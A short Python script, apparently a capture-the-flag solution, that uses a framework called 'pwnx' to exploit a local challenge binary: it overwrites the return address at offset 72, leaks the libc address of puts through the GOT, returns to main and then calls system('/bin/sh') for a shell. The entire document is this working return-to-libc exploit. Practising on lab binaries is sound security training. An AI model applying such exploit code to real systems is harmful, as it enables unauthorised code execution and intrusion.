from pwnx import Challenge, line, pointer


c = Challenge("./chall", libc="./libc.so.6")
c.control(line("payload: "), return_at=72)
c.learn(
    c.libc.puts,
    using=c.exe.write(1, c.exe.got.puts, 8),
    receive=pointer(8),
    resume=c.exe.main,
)
c.want(c.libc.system("/bin/sh"))

c.run()
